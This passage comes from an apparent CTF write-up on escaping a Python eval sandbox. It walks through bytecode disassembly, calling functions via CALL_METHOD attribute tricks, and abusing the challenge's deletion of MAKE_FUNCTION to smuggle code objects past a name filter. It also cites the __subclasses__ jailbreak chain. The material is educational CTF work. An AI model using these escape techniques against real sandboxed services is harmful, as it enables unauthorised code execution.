+<a class="sourceLine" id="cb15-6" title="6">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;&lt;lambda&gt;&#39;</span>, argrepr<span class="op">=</span><span class="st">&quot;&#39;&lt;lambda&gt;&#39;&quot;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb15-7" title="7">Instruction(opname<span class="op">=</span><span class="st">&#39;MAKE_FUNCTION&#39;</span>, opcode<span class="op">=</span><span class="dv">132</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="dv">0</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">4</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb15-8" title="8">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">6</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>I was a bit surprised to see an empty <code>co_names</code> and no <code>BINARY_ADD</code> opcode anywhere, but the pretty-printed argument values for the opcodes quickly reveal what’s going on. The <code>MAKE_FUNCTION</code> opcode takes two arguments on the stack, a code object and a function name, and produces a function. That code object used by the function has already been compiled and placed as a constant attached to the outer code object:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb16-1" title="1"><span class="op">&gt;&gt;&gt;</span> co.co_consts</a>
+<a class="sourceLine" id="cb16-2" title="2">(<span class="op">&lt;</span>code <span class="bu">object</span> <span class="op">&lt;</span><span class="kw">lambda</span><span class="op">&gt;</span> at <span class="bn">0x7fd18bc0e870</span>, <span class="bu">file</span> <span class="st">&quot;&lt;math&gt;&quot;</span>, line <span class="dv">1</span><span class="op">&gt;</span>, <span class="st">&#39;&lt;lambda&gt;&#39;</span>)</a></code></pre></div>
+<p>If we examine and disassemble that code object, we see the names and <code>BINARY_ADD</code> opcode we’re expecting:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb17-1" title="1"><span class="op">&gt;&gt;&gt;</span> co.co_consts[<span class="dv">0</span>].co_names</a>
+<a class="sourceLine" id="cb17-2" title="2">()</a>
+<a class="sourceLine" id="cb17-3" title="3"><span class="op">&gt;&gt;&gt;</span> <span class="cf">for</span> inst <span class="kw">in</span> dis.get_instructions(co.co_consts[<span class="dv">0</span>]): <span class="bu">print</span>(inst)</a>
+<a class="sourceLine" id="cb17-4" title="4">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_FAST&#39;</span>, opcode<span class="op">=</span><span class="dv">124</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb17-5" title="5">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_FAST&#39;</span>, opcode<span class="op">=</span><span class="dv">124</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;y&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;y&#39;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb17-6" title="6">Instruction(opname<span class="op">=</span><span class="st">&#39;BINARY_ADD&#39;</span>, opcode<span class="op">=</span><span class="dv">23</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">4</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb17-7" title="7">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">6</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>Just kidding, the parameter names are in <code>co_varnames</code> instead of <code>co_names</code>.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb18-1" title="1"><span class="op">&gt;&gt;&gt;</span> c.co_varnames</a>
+<a class="sourceLine" id="cb18-2" title="2">(<span class="st">&#39;x&#39;</span>, <span class="st">&#39;y&#39;</span>)</a></code></pre></div>
+<p>As of time of writing, I don’t think the <a href="https://docs.python.org/3/library/inspect.html"><code>inspect</code> module</a> documentation is entirely correct here. The first hit for <code>co_names</code> is a <a href="https://stackoverflow.com/questions/45147260/what-is-co-names">StackOverflow question</a>, which points to the <a href="https://github.com/python/cpython/blob/0ae40191793da1877a12d512f0116d99301b2c51/Lib/inspect.py#L497">source code docstring</a> as a more accurate source. There is also already an <a href="https://bugs.python.org/issue45492">issue</a> in the bug tracker.</p>
+<p>Anyway, if we try to compile a lambda that references names that aren’t arguments, they do appear in the inner code object’s <code>co_names</code>, and still don’t appear in the outer code object:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb19-1" title="1"><span class="op">&gt;&gt;&gt;</span> co <span class="op">=</span> <span class="bu">compile</span>(<span class="st">&#39;lambda: x + y&#39;</span>, <span class="st">&#39;&lt;math&gt;&#39;</span>, <span class="st">&#39;eval&#39;</span>)</a>
+<a class="sourceLine" id="cb19-2" title="2"><span class="op">&gt;&gt;&gt;</span> co.co_names</a>
+<a class="sourceLine" id="cb19-3" title="3">()</a>
+<a class="sourceLine" id="cb19-4" title="4"><span class="op">&gt;&gt;&gt;</span> co.co_consts[<span class="dv">0</span>].co_names</a>
+<a class="sourceLine" id="cb19-5" title="5">(<span class="st">&#39;x&#39;</span>, <span class="st">&#39;y&#39;</span>)</a></code></pre></div>
+<h3 id="reorienting-to-the-goal">Reorienting to the goal</h3>
+<p>Now that we understand a bit more about Python bytecode and code objects, let’s think more about what we want to end up achieving. It’s well-known that, even if you pass an empty dictionary as builtins to <code>exec</code> or <code>eval</code>, it’s still insecure; some useful references include Ned Batchelder’s <a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">Eval really is dangeous</a> and Gynvael Coldwind’s <a href="https://gynvael.coldwind.pl/n/python_sandbox_escape">Python “sandbox” escape</a>.</p>
+<p>Unfortunately, all these jailbreaks start with member accesses along the lines of <code>().__class__.__bases__[0].__subclasses__()</code>, which contain names with double underscores that the challenge replaces in the code object with <code>$INVALID$</code>, immediately breaking them. One alternate avenue that seemed promising to me at first was doing something with the <code>func_globals</code> attribute of <code>gift</code> (or some other function), as suggested in, for example, <a href="https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html">2013 PlaidCTF writeup by wapiflapi</a>; unfortunately, that attribute was <a href="https://docs.python.org/3/whatsnew/3.0.html#operators-and-special-methods">renamed to <code>__globals__</code> in Python 3.0</a>, so it fails in the same way. Another idea is that it’s fine if strings contain double underscores, and the <code>gift</code> function lets us <code>setattr</code> once with string literals that could contain double underscores. However, it’s really unclear what attribute we can set that will help us make progress towards one of the above jailbreaks; we really want <code>getattr</code>. So it’s also not immediately apparent if this is useful. Overall, I was not able to find any direct jailbreaks of this form that didn’t use any names containing double underscores.</p>
+<p>However, we saw from our earlier experimentation with code objects that, if we make a lambda and called it, names used by the lambda only appear in the <code>co_names</code> field of an inner code object, so the challenge won’t notice them. Even an expression like <code>(lambda: ().__class__.__bases__[0].__subclasses__())()</code> would sail through the name check. The same goes for any opcodes and control flow used by that lambda. So if we can figure out how to make and call a <em>single</em> lambda, we’re basically done with the challenge.</p>
+<p>Of course, we can do neither of those things, at least not directly, because <code>MAKE_FUNCTION</code> and all the <code>CALL_FUNCTION</code> opcodes are banned. Let’s resolve the latter obstacle first.</p>
+<h3 id="calling-a-function-without-calling-a-function">Calling a function without calling a function</h3>
+<p>We already saw that <code>CALL_METHOD</code> is not banned, which means that if we stick our lambda as an attribute onto something else, we can call it via that attribute without using any banned opcodes. Most built-in Python objects do not let you freely set attributes on them, but fortunately, one type of built-in Python object for which this does work is functions themselves. In sum, we could make and call a lambda without any <code>CALL_FUNCTION</code> opcodes with code like so:</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb20-1" title="1">x <span class="op">=</span> <span class="kw">lambda</span>: ()<span class="op">;</span> x.f <span class="op">=</span> x<span class="op">;</span> x.f()</a></code></pre></div>
+<p>This disassembles to:</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb21-1" title="1">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=&lt;</span>code <span class="bu">object</span> <span class="op">&lt;</span><span class="kw">lambda</span><span class="op">&gt;</span> at <span class="bn">0x7fd18bc0e450</span>, <span class="bu">file</span> <span class="st">&quot;&lt;math&gt;&quot;</span>, line <span class="dv">1</span><span class="op">&gt;</span>, argrepr<span class="op">=</span><span class="st">&#39;&lt;code object &lt;lambda&gt; at 0x7fd18bc0e450, file &quot;&lt;math&gt;&quot;, line 1&gt;&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-2" title="2">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;&lt;lambda&gt;&#39;</span>, argrepr<span class="op">=</span><span class="st">&quot;&#39;&lt;lambda&gt;&#39;&quot;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-3" title="3">Instruction(opname<span class="op">=</span><span class="st">&#39;MAKE_FUNCTION&#39;</span>, opcode<span class="op">=</span><span class="dv">132</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="dv">0</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">4</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-4" title="4">Instruction(opname<span class="op">=</span><span class="st">&#39;STORE_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">90</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">6</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-5" title="5">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">8</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-6" title="6">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">10</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-7" title="7">Instruction(opname<span class="op">=</span><span class="st">&#39;STORE_ATTR&#39;</span>, opcode<span class="op">=</span><span class="dv">95</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;f&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;f&#39;</span>, offset<span class="op">=</span><span class="dv">12</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-8" title="8">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">14</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-9" title="9">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_METHOD&#39;</span>, opcode<span class="op">=</span><span class="dv">160</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;f&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;f&#39;</span>, offset<span class="op">=</span><span class="dv">16</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-10" title="10">Instruction(opname<span class="op">=</span><span class="st">&#39;CALL_METHOD&#39;</span>, opcode<span class="op">=</span><span class="dv">161</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="dv">0</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">18</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-11" title="11">Instruction(opname<span class="op">=</span><span class="st">&#39;POP_TOP&#39;</span>, opcode<span class="op">=</span><span class="dv">1</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">20</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-12" title="12">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">2</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;None&#39;</span>, offset<span class="op">=</span><span class="dv">22</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb21-13" title="13">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">24</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>This sequence of opcodes would be the same if I replaced the trivial lambda with any other lambda, and although it contains <code>MAKE_FUNCTION</code>, it doesn’t contain any of the banned <code>CALL</code> opcodes. Also note that we can use this strategy to call the <code>gift</code> function provided to us by the challenge code. We can verify that this strategy works by inputting code such as the following:</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb22-1" title="1">gift.f <span class="op">=</span> gift<span class="op">;</span> gift.f(gift, <span class="st">&quot;foo&quot;</span>, <span class="st">&quot;bar&quot;</span>)<span class="op">;</span> x <span class="op">=</span> gift.foo</a></code></pre></div>
+<p>This causes the server to respond with <code>x = bar</code>, as expected. This makes sense because the instructions corresponding to this code do not contain any banned opcodes.</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb23-1" title="1">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;gift&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;gift&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-2" title="2">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;gift&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;gift&#39;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-3" title="3">Instruction(opname<span class="op">=</span><span class="st">&#39;STORE_ATTR&#39;</span>, opcode<span class="op">=</span><span class="dv">95</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;f&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;f&#39;</span>, offset<span class="op">=</span><span class="dv">4</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-4" title="4">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;gift&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;gift&#39;</span>, offset<span class="op">=</span><span class="dv">6</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-5" title="5">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_METHOD&#39;</span>, opcode<span class="op">=</span><span class="dv">160</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;f&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;f&#39;</span>, offset<span class="op">=</span><span class="dv">8</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-6" title="6">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;gift&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;gift&#39;</span>, offset<span class="op">=</span><span class="dv">10</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-7" title="7">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;foo&#39;</span>, argrepr<span class="op">=</span><span class="st">&quot;&#39;foo&#39;&quot;</span>, offset<span class="op">=</span><span class="dv">12</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-8" title="8">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;bar&#39;</span>, argrepr<span class="op">=</span><span class="st">&quot;&#39;bar&#39;&quot;</span>, offset<span class="op">=</span><span class="dv">14</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-9" title="9">Instruction(opname<span class="op">=</span><span class="st">&#39;CALL_METHOD&#39;</span>, opcode<span class="op">=</span><span class="dv">161</span>, arg<span class="op">=</span><span class="dv">3</span>, argval<span class="op">=</span><span class="dv">3</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">16</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-10" title="10">Instruction(opname<span class="op">=</span><span class="st">&#39;POP_TOP&#39;</span>, opcode<span class="op">=</span><span class="dv">1</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">18</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-11" title="11">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;gift&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;gift&#39;</span>, offset<span class="op">=</span><span class="dv">20</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-12" title="12">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_ATTR&#39;</span>, opcode<span class="op">=</span><span class="dv">106</span>, arg<span class="op">=</span><span class="dv">2</span>, argval<span class="op">=</span><span class="st">&#39;foo&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;foo&#39;</span>, offset<span class="op">=</span><span class="dv">22</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-13" title="13">Instruction(opname<span class="op">=</span><span class="st">&#39;STORE_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">90</span>, arg<span class="op">=</span><span class="dv">3</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">24</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-14" title="14">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">2</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;None&#39;</span>, offset<span class="op">=</span><span class="dv">26</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb23-15" title="15">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">28</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>The bigger obstacle is still the lack of <code>MAKE_FUNCTION</code> opcodes, which we’ll think about next.</p>
+<h3 id="making-a-function-without-making-a-function">Making a function without making a function</h3>
+<p>First, note that the <code>MAKE_FUNCTION</code> opcode wasn’t “banned” in the same way that control flow was banned. When the challenge code sees a <code>MAKE_FUNCTION</code> opcode, it doesn’t bail out, it <em>deletes that instruction</em> from the bytecode and carries on. Imagine what would happen in the above code if this happened: the <code>STORE_NAME</code> instruction would store the function name <code>"&lt;lambda&gt;"</code> instead of the lambda into <code>x</code>, and the bytecode would limp along afterwards with an extra code object floating on the stack. If we input:</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb24-1" title="1">x <span class="op">=</span> <span class="kw">lambda</span>: ()</a></code></pre></div>
+<p>The server responds:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb25-1" title="1">x <span class="op">=</span> <span class="op">&lt;</span><span class="kw">lambda</span><span class="op">&gt;</span></a></code></pre></div>
+<p>To be absolutely clear, this is literally the string <code>"&lt;lambda&gt;"</code> and not the string representation of an actual lambda, which whould look something like <code>&lt;function &lt;lambda&gt; at 0x7fe204c37310&gt;</code> instead.</p>
+<p>With a little setup, we could easily imagine putting that code object into a variable and then doing other things with it. My experience with this step might have been unusual (compare e.g. the <a href="https://org.anize.rs/dicectf-2022/misc/ti1337">Organizers’ writeup</a><a href="#fn1" class="footnote-ref" id="fnref1"><sup>1</sup></a>); but honestly, I didn’t think too hard about this; the first thing I tried worked:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb26-1" title="1">x, y <span class="op">=</span> <span class="dv">0</span>, <span class="kw">lambda</span>: ()</a></code></pre></div>
+<p>Intuitively, I expected that when this code functioned normally, it would get 0 and a lambda onto the stack and then put the top two elements of the stack into <code>x</code> and <code>y</code>. However, if the lambda never gets made then its “ingredients” would be on top of the stack and would go into <code>x</code> and <code>y</code> instead. And it does seem to do that. The server’s response to this code is:</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb27-1" title="1">x <span class="op">=</span> <span class="op">&lt;</span>code <span class="bu">object</span> <span class="op">&lt;</span><span class="kw">lambda</span><span class="op">&gt;</span> at <span class="bn">0x7f59d0ddab30</span>, <span class="bu">file</span> <span class="st">&quot;&lt;math&gt;&quot;</span>, line <span class="dv">1</span><span class="op">&gt;</span></a>
+<a class="sourceLine" id="cb27-2" title="2">y <span class="op">=</span> <span class="op">&lt;</span><span class="kw">lambda</span><span class="op">&gt;</span></a></code></pre></div>
+<p>Once you get this result, it’s not really important to understand why since you can just use <code>x</code> in the rest of the exploit. But for the curious, let’s disassemble it and take a closer look:</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb28-1" title="1"><span class="op">&gt;&gt;&gt;</span> co <span class="op">=</span> <span class="bu">compile</span>(<span class="st">&#39;x, y = 0, lambda: ()&#39;</span>, <span class="st">&#39;&lt;math&gt;&#39;</span>, <span class="st">&#39;exec&#39;</span>)</a>
+<a class="sourceLine" id="cb28-2" title="2"><span class="op">&gt;&gt;&gt;</span> <span class="cf">for</span> inst <span class="kw">in</span> dis.get_instructions(co): <span class="bu">print</span>(inst)</a>
+<a class="sourceLine" id="cb28-3" title="3">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="dv">0</span>, argrepr<span class="op">=</span><span class="st">&#39;0&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb28-4" title="4">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=&lt;</span>code <span class="bu">object</span> <span class="op">&lt;</span><span class="kw">lambda</span><span class="op">&gt;</span> at <span class="bn">0x7fe7360fa3a0</span>, <span class="bu">file</span> <span class="st">&quot;&lt;math&gt;&quot;</span>, line <span class="dv">1</span><span class="op">&gt;</span>, argrepr<span class="op">=</span><span class="st">&#39;&lt;code object &lt;lambda&gt; at 0x7fe7360fa3a0, file &quot;&lt;math&gt;&quot;, line 1&gt;&#39;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
